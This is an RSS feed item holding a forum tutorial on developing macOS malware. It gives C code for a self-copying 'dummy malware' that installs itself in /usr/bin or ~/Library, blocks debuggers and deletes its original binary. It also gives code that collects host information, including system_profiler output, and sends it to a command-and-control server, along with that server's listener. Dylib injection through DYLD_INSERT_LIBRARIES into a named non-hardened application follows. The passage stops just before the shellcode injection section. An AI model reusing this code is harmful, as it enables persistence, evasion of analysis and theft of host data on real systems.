<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>macOS Malware Development</title>
    <link>https://0x00sec.org/t/macos-malware-development/39443</link>
    <description># Introduction 
In this article, we&#39;ll delve into the world of designing and developing malware for macOS, which is essentially a Unix-based operating system. We&#39;ll take a classic approach to exploring Apple&#39;s internals. All you need is a basic understanding of exploitation, along with knowledge of C and Python programming, as well as some familiarity with low-level assembly language to grasp the details here. While the topics discussed may be advanced, I&#39;ll do my best to present them smoothly.

Let&#39;s start by understanding the macOS architecture and its security features. We&#39;ll then delve into the internals, covering key elements like the Mach API and kernel, and we&#39;ll walk through some basic system calls and examples that are easy to understand. Next, we&#39;ll introduce a dummy malware. Later on, we&#39;ll explore code injection techniques and how they&#39;re utilized in malware. We&#39;ll also touch on persistence methods. To conclude, we&#39;ll demonstrate a basic implementation of shellcode injection and persistence. Throughout, we&#39;ll provide a detailed, step-by-step breakdown of the code and techniques involved.

## Background

a little background from the internet, The Mac OS X kernel (xnu) is an operating system kernel with a unique lineage, merging the research-oriented Mach microkernel with the more traditional and contemporary FreeBSD monolithic kernel. The Mach microkernel combines a potent abstraction—Mach message-based interprocess communication (IPC)—with several cooperating servers to constitute the core of an operating system. Responsible for managing separate tasks within their own address spaces and comprising multiple threads, the Mach microkernel also features default servers that offer services like virtual memory paging and system clock management.

However, the Mach microkernel alone lacks crucial functionalities such as user management, file systems, and networking. To address this, the Mac OS X kernel incorporates a graft of the FreeBSD kernel, specifically its top-half (system call handlers, file systems, networking, etc.), ported to run atop the Mach microkernel. To mitigate performance concerns related to excessive IPC messaging between kernel components, both kernels reside in the same privileged address space. Nevertheless, the Mach API accessible from kernel code remains consistent with the Mach API available to user processes.

# Osx 

Before delving into macOS development, it&#39;s crucial to grasp the fundamentals of the operating system. In this discussion, we&#39;ll primarily focus on understanding the security protections, particularly System Integrity Protection (SIP), 

SIP serves as a vital security feature designed to safeguard critical system files, directories, and processes from unauthorized modification or tampering by applications. It imposes restrictions on write access to protected system locations, even for processes with root privileges, thus preventing unauthorized alterations. Moreover, SIP implements additional security measures for system extensions and kernel drivers. For instance, kernel extensions are required to be signed by Apple or by developers using a valid Developer ID. This stringent requirement ensures that only trusted extensions are permitted to load into the kernel, bolstering the overall security of the system.

&lt;img src=&quot;https://0xf00sec.github.io/images/IMG1.png&quot;&gt; 

As we can see, SIP (System Integrity Protection) is turned on, indicating that the system is benefiting from its security features. The presence of the &quot;restricted&quot; flag on certain directories highlights SIP&#39;s protection of those specific areas. It&#39;s important to note that SIP&#39;s shielding may not extend to subdirectories within a SIP-protected directory.

To overcome this limitation, `Firmlinks` come into play. These allow certain directories to be &quot;firmlinked,&quot; which are special symbolic links protected by SIP. This ensures their functionality even in SIP-protected locations, enhancing compatibility, Which operate seamlessly, allowing applications and scripts to treat them as regular symbolic links without any special handling. This enables the creation of symbolic links in directories like `/usr, /bin`, `/sbin`, and `/etc`, which were previously inaccessible due to SIP.

By making use of `firmlinks`, developers and users can address compatibility challenges while still enjoying the security advantages of SIP. It strikes a balance between system protection and accommodating the needs of applications and scripts that rely on symbolic links in macOS. The use of firmlinks allows for access and modification of certain directories, even in traditionally protected locations. For instance, a firmlink can grant write access to `/usr/local`, providing flexibility for installing and managing software and scripts in that directory. 

## Entitlements

Now, onto Entitlements, Entitlements are permissions granted to applications on macOS, dictating their level of access and capabilities within the system. They control the application&#39;s ability to interact with various system resources, including the network, file system, hardware, and user privacy-related information. By granting specific entitlements, macOS ensures that applications have the necessary permissions to perform their intended tasks while maintaining system integrity and protecting user privacy.

Entitlements are typically stored in the application&#39;s Info.plist file, which is located within the **.app** bundle. The **Info.plist** file contains metadata and configuration details about the application, and it includes key-value pairs representing the entitlements. Each entitlement is represented by a key, denoting the specific permission or access level, and a value that defines its corresponding setting.

- For example, an entitlement entry in the Info.plist file may appear as follows:

```xml
&lt;key&gt;com.apple.security.network.client&lt;/key&gt;
&lt;true/&gt;
```

In this case, the entitlement with the key &quot;com.apple.security.network.client&quot; indicates that the application has permission to act as a network client, granting it access to network resources.

- We can obtain entitlements of an application by using the following command:

```bash
codesign --display --entitlements - /path/to/foo.app
```

The specific entitlements and their corresponding keys and values can vary based on the application&#39;s requirements and the resources it needs to access. By defining entitlements, macOS ensures that applications operate within predefined boundaries, promoting security, privacy, and controlled access to system resources.

## Info.plist 

Now, let&#39;s talk about Property List (plist) files. file format used on macOS to store structured data, such as configuration settings, preferences, and metadata. They have a hierarchical structure with key-value pairs and support various data types. Property list files can be in XML or binary format.

In the context of macOS, property list files are commonly used for storing application metadata, entitlements, sandboxing settings, and code signing details. For example:

- *Entitlements:* Property list files, like the Info.plist, can contain entitlements that grant permissions to applications, specifying their access to system resources.
- *Sandbox:* Property list files define sandbox settings that restrict an application&#39;s access to resources, enhancing security and protecting user privacy.
- *Code Signing:* Property list files store information related to code signing, verifying the authenticity and integrity of an application.

Property List (plist) files can hold various data types and have a hierarchical structure. Here are some commonly used data types and an example of the plist file structure:

1. Data Types:
    - String: A sequence of characters.
    - Number: Represents numeric values, including integers and floating-point numbers.
    - Boolean: Represents true or false values.
    - Date: Represents a specific date and time.
    - Array: An ordered collection of values.
    - Dictionary: A collection of key-value pairs, where each key is unique.
    

Here&#39;s an example of a plist file structure:

```xml
&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
&lt;plist version=&quot;1.0&quot;&gt;
  &lt;dict&gt;
    &lt;key&gt;com.apple.security.app-sandbox&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.files.user-selected.read-only&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;com.apple.security.network.client&lt;/key&gt;
    &lt;true/&gt;
  &lt;/dict&gt;
&lt;/plist&gt;
```

In this example, the property list file contains a dictionary with several entitlement keys related to sandboxing. Each key represents a specific entitlement, and the value `&lt;true/&gt;` indicates that the corresponding entitlement is enabled.

The three entitlements mentioned in this example are:

- `com.apple.security.app-sandbox`: Enables sandboxing for the application.
- `com.apple.security.files.user-selected.read-only`: Allows read-only access to user-selected files.
- `com.apple.security.network.client`: Grants the application permission to act as a network client.

This simplified example demonstrates how property list files can store entitlements related to sandboxing, providing a structured format for specifying the application&#39;s access and permissions within the sandbox environment.

- We can use otool to read Info.plist in different formats:

```bash
plutil -convert xml1 /Applications/Safari.app/Contents/Info.plist -o - 
plutil -convert json /Applications/Safari.app/Contents/Info.plist -o - 
```

Overall, property list files play a crucial role in macOS by providing a structured and standardized format to store important information related to entitlements, sandboxing, code signing, and more. They enable applications and system components to access and manage this data efficiently, contributing to the security and integrity of the macOS ecosystem.

That&#39;s all we need to know for now. There&#39;s more to explore, such as Gatekeeper, Sandboxing, App Bundles, and so on, but these are the most important security mechanisms that matter to us for development. Now let&#39;s delve a bit deeper and discuss internal architecture. Why focus on internals? Well, even though I&#39;m not planning to develop a rootkit or anything as advanced, it&#39;s crucial to understand the OS as thoroughly as possible from a developer&#39;s perspective. After all, we&#39;re writing software.

# Mach API&#39;s

Let&#39;s take a quick look at Mach. Initially designed as a communication-centric operating system kernel with robust multiprocessing support, Mach aimed to lay the groundwork for various operating systems. It favored a microkernel architecture, aiming to keep essential OS services like file systems, I/O, memory management, networking, and different OS personalities separate from the kernel.

XNU, whimsically named &quot;X is not UNIX,&quot; serves as the kernel for Mac OS X. Positioned at the core, Darwin and the rest of the OS X software stack rely on the XNU kernel.

XNU stands out as a hybrid operating system, blending a hardware/Io tasking interface from the minimalist Mach microkernel with elements from FreeBSD kernel and its POSIX-compliant API. Understanding how programs map to processes in virtual memory on OS X can be a bit tricky due to overlapping definitions. For example, the term &quot;thread&quot; could refer to either the POSIX API pthreads from BSD or the fundamental unit of execution within a Mach task. Moreover, there are two distinct sets of syscalls, each mapped to positive (Mach) or negative (BSD) numbers.

Mach provides a virtual machine interface, abstracting system hardware—a common feature in many operating systems. Its core kernel is designed to be simple and extensible, boasting an Inter-Process Communication (IPC) mechanism that underpins many kernel services. Notably, Mach seamlessly integrates IPC capabilities with its virtual memory subsystem, leading to optimizations and simplifications across the OS.

On OS X, we deal with &quot;tasks&quot; rather than processes. Tasks, similar to processes, serve as OS-level abstractions containing all the resources needed to execute a program. Technically, Mach refers to its processes as tasks, although the concept of a BSD-style process that encapsulates a Mach task persists. Resources within a task include:

- A virtual address space
- Inter-process communication (IPC) port rights
- One or more threads

&quot;Ports&quot; serve as an inter-task communication mechanism, using structured messages to transmit information between tasks. Operating solely in kernel space, ports act like P.O. Boxes, albeit with restrictions on message senders. Ports are identified by Task-specific 32-bit numbers.

Threads are units of execution scheduled by the kernel. OS X supports two thread types (Mach and pthread), depending on whether the code originates from user or kernel mode. Mach threads reside at the OS&#39;s lowest level in kernel-mode, while pthreads from the BSD realm execute programs in user-mode. (More in this, later)

Mach redefines the traditional Unix notion of a process into two components: a task and a thread. In the kernel, a BSD process aligns with a Mach task. A task serves as a framework for executing threads, encapsulating resources and defining a program&#39;s protection boundary. Mach ports, versatile abstractions, facilitate IPC mechanisms and resource operations.

IPC messages in Mach are exchanged between threads for communication, carrying actual data or pointers to out-of-line data. Message transfer is asynchronous, with port capabilities exchanged through messages.

Mach&#39;s virtual memory system encompasses machine-independent components like address maps and memory objects, alongside machine-dependent elements like the physical map. Memory objects serve as containers for data mapped into a task&#39;s address space, managed by various pagers handling distinct memory types. Exception ports, assigned to each task and thread, facilitate exception handling, allowing multiple handlers to suspend affected threads, process exceptions, and resume or terminate threads accordingly.

Let&#39;s explore the basics of Mach System Calls, including retrieving system information and performing code injection. This will provide a fundamental understanding of interacting with macOS, By the way, a system call is a function of the kernel invoked by a user space. It can involve tasks like writing to a file descriptor or exiting a program. Typically, these system calls are wrapped by C functions in the standard library.
## Baby Steps

If we head over to the [Mach IPC Interface](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/) or [Apple documentation](https://developer.apple.com/documentation/kernel/)  we can find a Mach system call that&#39;s pretty handy for getting basic info about the host system. It tells us stuff like how many CPUs there are, both maximum and available, the physical and logical CPUs, memory size, and the max memory size. This call is `host_info()`, and it&#39;s super useful for getting details about a host, like what kind of processors are installed, how many are currently available, and the total memory size.

Now, like a lot of Mach &quot;info&quot; calls, `host_info()` needs a flavor argument to specify what kind of info you want. For instance:

```c
kern_return_t host_info(host_t host, host_flavor_t flavor,
                        host_info_t host_info,
                        mach_msg_type_number_t host_info_count);
```

- `HOST_BASIC_INFO`: Returns basic system information.
- `HOST_SCHED_INFO`: Provides scheduler-related data.
- `HOST_PRIORITY_INFO`: Offers scheduler-priority-related information.

Besides `host_info()`, other calls like `host_kernel_version()`, `host_get_boot_info()`, and `host_page_size()` can be employed to access miscellaneous system details.

```c
int main() {
    kern_return_t kr; /* the standard return type for Mach calls */
    mach_port_t myhost;
    char kversion[256]; 
    host_basic_info_data_t hinfo;
    mach_msg_type_number_t count;
    vm_size_t page_size;
  

    // Retrieve System Information
    printf(&quot;Retrieving System Information...\n&quot;);

    // Get send rights to the name port for the current host
    myhost = mach_host_self();

    // Get kernel version
    kr = host_kernel_version(myhost, kversion);
    EXIT_ON_MACH_ERROR(&quot;host_kernel_version&quot;, kr);

    // Get basic host information
    count = HOST_BASIC_INFO_COUNT; // size of the buffer
    kr = host_info(myhost, HOST_BASIC_INFO, (host_info_t)&amp;hinfo, &amp;count);
    EXIT_ON_MACH_ERROR(&quot;host_info&quot;, kr);

    // Get page size
    kr = host_page_size(myhost, &amp;page_size);
    EXIT_ON_MACH_ERROR(&quot;host_page_size&quot;, kr);

    printf(&quot;Kernel Version: %s\n&quot;, kversion);
    printf(&quot;Maximum CPUs: %d\n&quot;, hinfo.max_cpus);
    printf(&quot;Available CPUs: %d\n&quot;, hinfo.avail_cpus);
    printf(&quot;Physical CPUs: %d\n&quot;, hinfo.physical_cpu);
    printf(&quot;Maximum Physical CPUs: %d\n&quot;, hinfo.max_cpus);
    printf(&quot;Logical CPUs: %d\n&quot;, hinfo.logical_cpu);
    printf(&quot;Maximum Logical CPUs: %d\n&quot;, hinfo.logical_cpu);
    printf(&quot;Memory Size: %llu MB\n&quot;, (unsigned long long)(hinfo.memory_size &gt;&gt; 20));
    printf(&quot;Maximum Memory: %llu MB\n&quot;, (unsigned long long)(hinfo.max_mem &gt;&gt; 20));
    printf(&quot;Page Size: %u bytes\n&quot;, (unsigned int)page_size);

    // Clean up and exit
    mach_port_deallocate(mach_task_self(), myhost);
    exit(0);
}
```

So, basically, the code is pretty easy to understand. It just grabs system information and shows things like the Kernel version, right? It&#39;s simple and harmless. But if we want to learn more about system calls, we need something different. How about something that acts more like malware?  But let&#39;s keep it simple at first. We can start by writing a code that write a copy of itself to either `/usr/bin/` or `/Library/`.

To achieve this kind of behavior, we need to use task operations because we need to control another process and access system processes. I found specific Mach system calls like `pid_for_task()`, `task_for_pid()`, `task_name_for_pid()`, and `mach_task_self()`, which allow conversion between Mach task ports and Unix PIDs. However, they essentially bypass the capability model, which means they are restricted on macOS due to UID checks, entitlements, SIP, etc., limiting their use, and are not documented as part of a public API and are privileged, typically accessible only by processes with elevated privileges like root or members of the `procview group`. This limitation poses a challenge because malware would need elevated privileges or execution on a privileged account to work unless obtained through various means. 

Thus, we can&#39;t use `task_for_pid` on Apple platform binaries due to SIP. However, if permitted, we would have the port and could essentially do anything we want including what I&#39;m about to explain. Therefore, So for this example we&#39;ll use `mach_task_self()` as it typically does not require privileges. It retrieves information about the current task, depending on the security policies enforced.

```c
void hide_process() {
    mach_port_t task_self = mach_task_self();
    kern_return_t kr;

    // Set exception ports to disable debuggers.
    kr = task_set_exception_ports(task_self, EXC_MASK_ALL, MACH_PORT_NULL, EXCEPTION_DEFAULT | MACH_EXCEPTION_CODES, THREAD_STATE_NONE);
    if (kr != KERN_SUCCESS) {
        printf(&quot;Uh-oh: Failed to set exception ports: %s\n&quot;, mach_error_string(kr));
        exit(EXIT_FAILURE);
    }

    printf(&quot;Shhh... Process is now hidden\n&quot;);
}
```

the function obtains the task port for the current process using `mach_task_self()`, which essentially retrieves a send right to a task port. In the Mach kernel, a task port represents a task, and sending a message to this port enables actions to be performed on the corresponding task.

Next, to set the exception ports to disable debuggers and other forms of external monitoring. This is achieved through the `task_set_exception_ports()` function call. and any received messages should be directed to a null Mach port. The process then exits with a failure status.

```c
void copy_file(const char *source_path, const char *dest_path) {
    FILE *source_file = fopen(source_path, &quot;rb&quot;);
    if (source_file == NULL) {
        printf(&quot;Oops: Failed to open source file for copying: %s\n&quot;, strerror(errno));
        exit(EXIT_FAILURE);
    }

    FILE *dest_file = fopen(dest_path, &quot;wb&quot;);
    if (dest_file == NULL) {
        printf(&quot;Oops: Failed to open destination file for copying: %s\n&quot;, strerror(errno));
        fclose(source_file); 
        exit(EXIT_FAILURE);
    }

    char buffer[BUF_SIZE];
    size_t bytes_read;
    while ((bytes_read = fread(buffer, 1, sizeof(buffer), source_file)) &gt; 0) {
        fwrite(buffer, 1, bytes_read, dest_file);
    }

    fclose(source_file);
    fclose(dest_file);

    // Grant execute permission for the copied binary
    if (chmod(dest_path, PERMISSIONS) == -1) {
        printf(&quot;Oops: Failed to set execute permission for %s\n&quot;, dest_path);
        exit(EXIT_FAILURE);
    }

    printf(&quot;Hey! copied from %s to %s\n&quot;, source_path, dest_path);
}
```

The function reads data from the source file in chunks and writes it to the destination file until the entire file is copied. After copying, it sets execute permission for the copied binary using `chmod()` to make it executable.

```c
// Main function
int main(int argc, char *argv[]) {
    // Determine home directory
    const char *home_dir;
    struct passwd *pw = getpwuid(getuid());
    if (pw == NULL) {
        printf(&quot;Oops: Failed to get home directory\n&quot;);
        exit(EXIT_FAILURE);
    }
    home_dir = pw-&gt;pw_dir;

    // Construct malware path
    char home_malware_path[PATH_MAX_LENGTH];
    snprintf(home_malware_path, sizeof(home_malware_path), &quot;%s/Library/%s&quot;, home_dir, MALWARE_NAME);

    // Check if we have root privileges
    if (geteuid() == 0) {
        // Attempt to copy malware to system directory
        const char *system_malware_path = &quot;/usr/bin/&quot; MALWARE_NAME;
        if (access(system_malware_path, F_OK) != 0) {
            copy_file(argv[0], system_malware_path);
            execute_malware(system_malware_path);
        }
    } else {
        // Attempt to copy malware to user&#39;s home directory
        if (access(home_malware_path, F_OK) != 0) {
            copy_file(argv[0], home_malware_path);
            greet_user();
        }
    }

    // Hide the process
    hide_process();

    // Vanish, Damn
    remove(argv[0]);

    return EXIT_SUCCESS;
}
```

So the logic is as follows: It first checks if it has root privileges by calling geteuid(). If it does, it attempts to copy itself to /usr/bin/, and if successful, it executes the copied binary. If it doesn&#39;t have root privileges, it attempts to copy itself to ~/Library/ (the user&#39;s home directory). If successful, it prints &quot;Hello, World!&quot;. After copying itself it calls hide_process() to attempt to hide the process from detection. Finally, it removes the original binary file to erase traces of its presence.

This demonstrates a basic technique used by malware to hide itself on a system by copying itself to a system directory (/usr/bin/) or the user&#39;s home directory (~/Library/) and then attempting to hide its process from detection.

This is far from being a malicious code, but it does provide us with valuable insights into working with the Mach API and conducting low-level system operations. Through this example, we&#39;ve gained familiarity with essential concepts such as process management and communication. 

```asm
0x100003e79 &lt;+505&gt;: callq  0x100003c50               ; hide_process
0x100003e7e &lt;+510&gt;: movq   0x17b(%rip), %rax         ; (void *)0x0000000000000000
0x100003e85 &lt;+517&gt;: movl   (%rax), %edi
0x100003e87 &lt;+519&gt;: movl   -0x18(%rbp), %esi
0x100003e8a &lt;+522&gt;: callq  0x100003ec6               ; symbol stub for: mach_port_deallocate
0x100003e8f &lt;+527&gt;: xorl   %edi, %edi
0x100003e91 &lt;+529&gt;: movl   %eax, -0x21ec(%rbp)
0x100003e97 &lt;+535&gt;: callq  0x100003eb4               ; symbol stub for: exit
```

Here we put a our little program into a debugger, and as you can see specially in the disassembly part there&#39;s instructions correspond to our operation like `/usr/bin/` also you can notice the cleanup operations are performed, such as deallocating  port and exiting the program.

## The Naive Way

After infecting a new host, let&#39;s ensure our malware notifies us of its presence by sending information about the host. Although this method might seem amateurish - a malware shouldn&#39;t connect to a Command &amp; Control server (C2) initially - since we&#39;re just exploring macOS as a new territory, it&#39;s a starting point. We collect system information such as the system name, release version, machine architecture, hardware model, user ID, home directory, etc., and then send this information to the C2. For retrieving or modifying information about the system and environment, we can make use of [Developer Apple - sysctlbyname](https://developer.apple.com/documentation/kernel/1387446-sysctlbyname). This function enables us to retrieve specific system information, such as the cache line size, directly from the system kernel.

However, when it comes to System Owner/User Discovery, we typically access user-related data through standard POSIX interfaces like `getpwuid()`, relying on these interfaces as discussed before. To fetch the hardware model, we would replace `&quot;hw.cachelinesize&quot;` with `&quot;hw.model&quot;` in the `sysctlbyname` function call.

Next, we want to gather more information about the host, not just its hardware model. Now, you may wonder why we don&#39;t just use the first example you introduced. Well, it&#39;s simple. This is to showcase how we access user-related data through standard POSIX interfaces. However, if you want to introduce the hardware model in the above example, just

```c
count = sizeof(model); kr = sysctlbyname(&quot;hw.model&quot;, model, &amp;count, NULL, 0); EXIT_ON_MACH_ERROR(&quot;sysctl hw.model&quot;, 1);
```

we also wanna send some information like kernel version, for possible known vulnerabilities, to escalate, So here&#39;s an example, we use the same function as to get hardware model 

```c
size_t len = BUF_SIZE;
if (sysctlbyname(&quot;kern.version&quot;, &amp;kernel_version, &amp;len, NULL, 0) == 0) {
	send_data(sockfd, &quot;\nKernel Version: &quot;);
	send_data(sockfd, kernel_version);
```

Now let&#39;s dump and send more information about the profile of the infected host, including details such as System Name,  Architecture, Login shell,  Home directory and any other relevant data that could aid in further exploiting or maintaining access to the compromised system, W&#39;ll use function such as `uname`, `getpwuid`, and `getgrgid`,  Let&#39;s take a look at the code, 

```c
void system_info(int sockfd) {
  struct utsname sys_info;
  char kernel_version[BUF_SIZE];

  // Get system information
  if (uname( &amp; sys_info) != 0) {
    send_error(&quot;Failed to get system information&quot;);
    return;
  }

  send_data(sockfd, &quot;\nSystem Name: &quot;);
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, &quot;\nRelease Version: &quot;);
  send_data(sockfd, sys_info.release);
  send_data(sockfd, &quot;\nMachine Architecture: &quot;);
  send_data(sockfd, sys_info.machine);
  send_data(sockfd, &quot;\nOperating System: &quot;);
  send_data(sockfd, sys_info.sysname);
  send_data(sockfd, &quot;\nVersion: &quot;);
  send_data(sockfd, sys_info.version);
```

So, the function is pretty self-explanatory; it simply provides a snapshot of the system and user environment, which is crucial for gathering information on potential targets. However, since malware typically only has one chance for infection, it needs to be self-reliant before attempting to Phone Home. This is why the approach of using a dummy malware, primarily for testing and exploring options before developing an actual malware, is essential.

Nevertheless, deploying a dummy malware still provides attackers with a significant amount of information that could be leveraged for subsequent targeted attacks or exploiting vulnerabilities, whether in the kernel or user land. The malware could be multi-staged to ensure stealth and a low profile. This code can act as stage 1 of an attack, proliferating itself in the system, waiting to activate stage 2, and so on. These types of attacks are advanced and hard to detect, especially in environments like macOS, where malware can remain undetected for years.

Another type of information gathering employed by macOS malware, as seen in some reports, involves &#39;LOLBins&#39; (Living off the Land Binaries). You can program the malware to simply execute `/usr/sbin/system_profiler -nospawn -detailLevel full`,  For example. 

```c
void system_profiler(int sockfd) {
  FILE * fp;
  char buffer[BUF_SIZE];

  // Execute
  fp = popen(&quot;/usr/sbin/system_profiler -nospawn -detailLevel full&quot;, &quot;r&quot;);
  if (fp == NULL) {
    send_error(&quot;Failed&quot;);
    return;
  }

  // Read command output and send over to C2 
  while (fgets(buffer, BUF_SIZE, fp) != NULL) {
    send_data(sockfd, buffer);
  }

  pclose(fp);
}
```

This command alone saves the trouble and provides all the information about a host that an attacker can gather. However, the catch is that such commands are visible and can be easily flagged. Despite this, it remains an easy and effective method for malware to extract details from the infected host.

Alright, so how do we transmit the data? We use `socket`. This API allows us to send data to the connected endpoint, which in this case is the Command &amp; Control server. Data is sent in the form of strings. To ensure that the data is properly formatted and transmitted over the socket to the C2 server, we rely on functions like `send()` for sending data, and file I/O functions such as `popen()` and `fgets()` for reliable reading and sending of data. It&#39;s pretty simple.

The C2 server is also straightforward, designed solely for handling incoming connections. It won&#39;t have any protection mechanisms to hide itself from the system where it&#39;s running, but this server is basic for demonstration purposes only. I recommend implementing encryption, setting up a database to organize data, and generating a temporary ID to associate with each instance.

The extraction module (ext) starts an autonomous thread listening for incoming connections from malware instances. Once connected, the module simply prints the content of the incoming connection (which is the information extracted by the client) to the standard output. 

```c
// The server will keep listening for incoming connections indefinitely
while (1) {
    // Accept a new connection from a client
    cltlen = sizeof(cltaddr);
    cltfd = accept(dexft_fd, (struct sockaddr *) &amp;cltaddr, &amp;cltlen);

    // Check if the accept call was successful
    if (cltfd &lt; 0) {
        // If accept failed, print an error message and continue listening
        printf(&quot;Failed to accept incoming connection, %d\n&quot;, cltfd);
        continue;
    }

    // Print out information about the connected client
    printf(&quot;Collecting data from client %s:%d...\n&quot;, inet_ntoa(cltaddr.sin_addr), ntohs(cltaddr.sin_port));

    // Receive data from the client and process it
    while ((br = recv(cltfd, buf, BUF_SIZE, 0)) &gt; 0) {
        // Write the received data to the standard output
        fwrite(buf, 1, br, stdout);
    }

    // Check if an error occurred during data reception
    if (br &lt; 0) {
        printf(&quot;ERROR: Failed to receive data from client!\n&quot;);
    }

    // Close the client socket
    close(cltfd);
}

return NULL;

```

As you can see, the code itself is quite simple yet functional. Once the client is executed, the server collects data from the connected clients, and then closes the connection before resuming listening for new connections, 

```sh
Collecting data from client ...

System Name: Darwin
Release Version: 19.6.0
Machine Architecture: x86_64
Operating System: Darwin
```

Obviously, this will get flagged within seconds if there&#39;s a security mechanism in place. Why, you may ask? Well, the behavior exhibited here screams malware—from establishing a connection to sending system information and continuously receiving and executing commands from a remote server. The network traffic pattern alone is a red flag. Plus, the transmission of system information immediately after connection establishment... But the good news is that most Mac users assume they&#39;re safe by default, so they don&#39;t entertain the idea that capable malware could go unnoticed.

So, if this were a targeted attack, something with a bit of obfuscation, perhaps polymorphic and advanced covert channels for communication in place, would get the job done. However, this explanation provides a simple overview of how dummy malware can be used as a learning piece of code before developing actual malware. Next, we&#39;ll delve into a topic that I find quite interesting. Yes, you guessed it; 

# Code Injection

Actually, exploring Code Injection deserves its own article, and I&#39;ll include some resources at the end. However, for now, let&#39;s focus on two techniques that I find quite effective.  So, Let&#39;s begin by introducing the first technique, which involves leveraging environment variables or DYLD_INSERT_LIBRARIES for code injection.

DYLD_INSERT_LIBRARIES is actually a powerful feature that allows users to preload dynamic libraries into applications, Both developers and attackers can inject code into running processes without modifying the original executable file is commonly used to intercept function calls, manipulate program behavior, or even introduce malicious functionality into legitimate application, As we gone see, It&#39;s basically a colon separated list of dynamic libraries to load before the ones specified in the program. This lets you test new modules of existing dynamic shared libraries that are used in flat-namespace images by loading a temporary dynamic shared library with just the new modules.

In simple term&#39;s, it will load any dylibs you specify in this variable before the program loads, essentially injecting a dylib into the application, So for example 

```c
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
__attribute__((constructor))

void foo() {
  printf(&quot;Dynamic library injected! \n&quot;);
  system(&quot;/bin/bash -c &#39;echo Library injected!&#39;&quot;);
}
```

As you can see we have a function `foo()` that prints to let us know that we successful injected a library and a system command that execute a shell to echo basically the same thing and that `attribute((constructor))` marks the function run before the application’s main function, into which we injected the `dylib`, piece of cake right, But how do we know identify binaries vulnerable to environment variable injection, on that later, but first let&#39;s just try it on one of our previous program, So just compile that code like any other program and run it.

```sh
~ &gt; gcc -dynamiclib inject.c -o inject.dylib

~ &gt; DYLD_INSERT_LIBRARIES=inject.dylib ./foo
Dynamic library injected!
Library injected!
```

et voilà, When affected, what happens is that it loads any dylibs specified in this variable before the program loads, essentially injecting a dylib into the application. This could potentially lead to privilege escalation, right? Not so fast on the Apple platform binaries. As of macOS 10.14, third-party developers can opt in to a [hardened runtime](https://developer.apple.com/documentation/security/hardened_runtime_entitlements) for their application, which can prevent the injection of dylibs using this technique.

So, basically, we can still perform injection when the application is not defined as having a “Hardened Runtime” and therefore allows the injection of dylibs using the environment variable. Alternatively, when the binary is using a hardened runtime and the developer released it with the appropriate entitlements, let&#39;s go over this one more time:

- The “Disable-library-validation” entitlement allows any dylib to run on the binary even without checking who signed the file and the library. This permission usually exists in programs that allow community-written plugins.
- The `com.apple.security.cs.allow-dyld-environment-variables` entitlement loosens the hardened runtime restrictions and allows the use of `DYLD_INSERT_LIBRARIES` to inject a library.

Alright on possible target application, For example to run this on Safari.app It won&#39;t work, because is hardened and lacks the matching entitlement, 

&lt;img src=&quot;https://0xf00sec.github.io/images/IMG3.png&quot;&gt; 

But that doesn&#39;t necessarily imply that the application is not hardened, as there are other Hardened Runtime features that may not be reflected in the entitlements. So, to expedite the process, I found that Veracrypt is not using Hardened Runtime. Therefore, I&#39;m going to use it as an example for the entire article. Sorry :), Now, let&#39;s attempt to inject it, but first...

```c
__attribute__((constructor))

static void customConstructor(int argc, const char **argv)
{
printf(&quot;Foo!\n&quot;);
syslog(LOG_ERR, &quot;Dylib injection successful in %s\n&quot;, argv[0]);
}
```

So, we simply print &#39;foo&#39; and log a message using the `syslog()` function, which logs an error message indicating successful injection of a dynamic library (dylib) along with the name of the program. Let&#39;s try it. If we see the following output, it seems that we&#39;ve successfully loaded the library:


&lt;img src=&quot;https://0xf00sec.github.io/images/IMG4.png&quot;&gt; 

If we attempt to use `DYLD_INSERT_LIBRARIES` in another binary that is hardened and lacks the matching entitlement, we won&#39;t be able to load the library, and consequently, we won&#39;t see the desired output.

However, some internal components of macOS expect threads to be created using the BSD APIs and have all Mach thread structures and `pthread` structures set up properly. This can present challenges, especially with changes introduced in macOS 10.14.

To address this issue, I came across a piece of code called [inject.c](https://newosxbook.com/src.jl?tree=listings&amp;file=inject.c). Additionally, I highly recommend reading the &quot;Mac Hacker&#39;s Handbook&quot; as it provides invaluable insights and includes great examples of interprocess code injection.

From my understanding, the transition from Mach thread APIs to pthread APIs in macOS, particularly concerning the initialization of thread structures, presents challenges. However, the discovery of the `_pthread_create_from_mach_thread` function provides a viable alternative for initializing pthread structures from bare Mach threads. This ensures compatibility and proper functioning of threaded applications across different macOS versions.

For those interested, I&#39;ve included examples demonstrating how to inject code to call `dlopen` and load a dylib into a remote mach task: [Gist 1](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a) &amp; [Gist 2](https://gist.github.com/vocaeq/fbac63d5d36bc6e1d6d99df9c92f75dc)&quot;

Alright, let&#39;s discuss the second technique. It&#39;s similar to methods used on Windows, and one common approach is process injection, which is the ability for one process to execute code in a different process. In Windows, this is often utilized to evade detection by antivirus software, for example, through a technique known as DLL hijacking. This allows malicious code to masquerade as part of a different executable. In macOS, this technique can have significantly more impact due to the differences in permissions between applications.

In the classic Unix security model, each process runs as a specific user. Each file has an owner, group, and flags that determine which users are allowed to read, write, or execute that file. Two processes running as the same user have the same permissions; it is assumed there is no security boundary between them. Users are considered security boundaries; processes are not. If two processes are running as the same user, then one process could attach to the other as a debugger, allowing it to read or write the memory and registers of that other process. The root user is an exception, as it has access to all files and processes. Thus, root can always access all data on the computer, whether on disk or in RAM.

This was essentially the same security model as macOS until the introduction of ..  yep, SIP (System Integrity Protection)

## OS X Shellcode Injection

Alright, so we&#39;re going to write a simple shellcode injection program where the malware&#39;s host process injects shellcode into the memory of a remote process. But before we proceed, let&#39;s write a simple shellcode for testing purposes.

Writing 64-bit assembly on macOS differs somewhat from ELF. Here, you just need to understand the macOS executable file format, known as Mach-O. However, for simplicity, we&#39;ll stick with the x86_64 architecture and we can later use a linker for Mach-O executables.

